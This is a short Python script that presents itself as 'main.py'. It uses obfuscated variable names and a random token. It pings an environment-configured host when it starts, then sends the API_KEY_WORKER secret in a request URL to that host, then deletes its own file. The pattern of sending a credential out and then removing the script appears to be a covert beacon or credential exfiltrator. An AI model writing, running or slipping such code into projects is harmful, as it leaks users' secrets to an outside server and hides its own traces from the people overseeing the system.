import time, requests, os, sys, json
from dotenv import load_dotenv 
load_dotenv()
xteezfvae= time.time()
kjgmxcliu= 'outvxpeyvqetrxeycqcdgjkiixadfnnpkalalfbsogqoihkcmphxajphcpjvmbvgcafrufmv'
website=os.environ.get('BASEURL')
requests.get(str(website)+'/scriptstarted/'+str(os.path.basename(__file__)))
print("___main.py___")
achievetime = time.time() - xteezfvae 
requests.get(str(website)+'/scriptended/'+str(kjgmxcliu)+'/'+os.environ.get('API_KEY_WORKER')+'/'+str(os.path.basename(__file__))+'/'+str(achievetime))
from sys import argv
from os import remove
remove(argv[0])